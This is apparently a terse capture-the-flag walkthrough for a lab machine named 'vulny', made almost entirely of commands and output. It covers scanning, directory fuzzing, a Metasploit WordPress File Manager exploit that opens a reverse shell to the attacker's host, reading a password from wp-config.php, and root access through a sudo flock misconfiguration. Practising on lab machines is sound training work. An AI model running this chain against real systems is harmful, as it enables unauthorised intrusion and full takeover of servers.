@@ -1,0 +1,157 @@
+fping -aqg 10.0.2.1/24
+
+nmap -A -v -p- -T4 10.0.2.82
+
+80/tcp    open  http    Apache httpd 2.4.41 ((Ubuntu))
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+|_http-server-header: Apache/2.4.41 (Ubuntu)
+|_http-title: Apache2 Ubuntu Default Page: It works
+33060/tcp open  mysqlx?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, LDAPSearchReq, NotesRPC, SSLSessionReq, TLSSessionReq, X11Probe, afp: 
+|     Invalid message"
+|_    HY000
+
+
+-------------------------------------------------------------------------------------------------
+──(root💀kali)-[/home/kali]
+└─# ffuf -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.82/FUZZ -e .html,.txt,.php
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.82/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .html .txt .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+.php                    [Status: 403, Size: 274, Words: 20, Lines: 10]
+.html                   [Status: 403, Size: 274, Words: 20, Lines: 10]
+index.html              [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+                        [Status: 200, Size: 10918, Words: 3499, Lines: 376]
+javascript              [Status: 301, Size: 311, Words: 20, Lines: 10]
+secret                  [Status: 301, Size: 307, Words: 20, Lines: 10]
+----------------------------------------------------------------------------------------------------------------------------------------------
+┌──(root💀kali)-[/home/kali]
+└─# ffuf -c -ic -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.0.2.82/secret/FUZZ -e .html,.txt,.php
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1 Kali Exclusive <3
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://10.0.2.82/secret/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+ :: Extensions       : .html .txt .php 
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: 200,204,301,302,307,401,403,405
+________________________________________________
+
+.php                    [Status: 403, Size: 274, Words: 20, Lines: 10]
+.html                   [Status: 403, Size: 274, Words: 20, Lines: 10]
+wp-content              [Status: 301, Size: 318, Words: 20, Lines: 10]
+wp-includes             [Status: 301, Size: 319, Words: 20, Lines: 10]
+readme.html             [Status: 200, Size: 7368, Words: 754, Lines: 99]
+wp-admin                [Status: 301, Size: 316, Words: 20, Lines: 10]
+---------------------------------------------------------------------------------------------------------------------------------------------------
+open firefox and go http://10.0.2.82/secret/wp-content/uploads/2020/10/ 
+wp-file-manager-6.O.zip
+
+-------------------
+msfconsole -q 
+msf6 > use exploit/multi/http/wp_file_manager_rce
+msf6 exploit(multi/http/wp_file_manager_rce) > set RHOSTS 10.0.2.82
+msf6 exploit(multi/http/wp_file_manager_rce) > set ForceExploit true
+ForceExploit => true
+msf6 exploit(multi/http/wp_file_manager_rce) > set TARGETURI /secret
+TARGETURI => /secret
+msf6 exploit(multi/http/wp_file_manager_rce) > set LHOST 10.0.2.52
+msf6 exploit(multi/http/wp_file_manager_rce) > run
+
+[*] Started reverse TCP handler on 10.0.2.52:4444 
+[*] Executing automatic check (disable AutoCheck to override)
+[!] Cannot reliably check exploitability. ForceExploit is enabled, proceeding with exploitation.
+[*] 10.0.2.82:80 - Payload is at /secret/wp-content/plugins/wp-file-manager/lib/files/l1xyTX.php
+[*] Sending stage (39282 bytes) to 10.0.2.82
+[*] Meterpreter session 2 opened (10.0.2.52:4444 -> 10.0.2.82:50150) at 2022-03-29 17:40:29 -0400
+[+] Deleted l1xyTX.php
+
+meterpreter > shell
+Process 2765 created.
+Channel 0 created.
+python3 -c "import pty;pty.spawn('/bin/bash')"
+<ress/wp-content/plugins/wp-file-manager/lib/files$ export TERM=xterm
+export TERM=xterm
+www-data@vulny:/usr/share/wordpress/wp-content/plugins/wp-file-manager/lib/files$ 
+
+
+
+
+------------------------------------------------------------------------------------------------
+##www-data to adrian##
+www-data@vulny:/$ cd /usr/share/wordpress
+cd /usr/share/wordpress
+www-data@vulny:/$ cat wp-config.php
+
+is readable by the webserver and contains the right password/username.";
+    exit(1);
+}
+
+/* idrinksomewater */                     ---> adrian's password
+
+/* Default value for some constants if they have not yet been set
+   by the host-specific config files */
+if (!defined('ABSPATH'))
+
+
+
+www-data@vulny:/usr/share/wordpress$ su - adrian
+su - adrian
+Password: idrinksomewater
+
+adrian@vulny:~$ 
+-----------------------------------------------------------------------------------------------------
+##adrian to root##
+adrian@vulny:~$ sudo -l
+sudo -l
+Matching Defaults entries for adrian on vulny:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User adrian may run the following commands on vulny:
+    (ALL : ALL) NOPASSWD: /usr/bin/flock
+adrian@vulny:~$ sudo flock -u root /bin/bash
+sudo flock -u root /bin/bash
+root@vulny:/home/adrian# 
+-------------------------------------------------------------------------------------------------
+root@vulny:/home/adrian# id ; uname -a ; whoami
+id ; uname -a ; whoami
+uid=0(root) gid=0(root) groups=0(root)
+Linux vulny 5.4.0-51-generic #56-Ubuntu SMP Mon Oct 5 14:28:49 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
+root
+root@vulny:/home/adrian# 
+---------------------------------------------------------------------------------------------------------------------
+
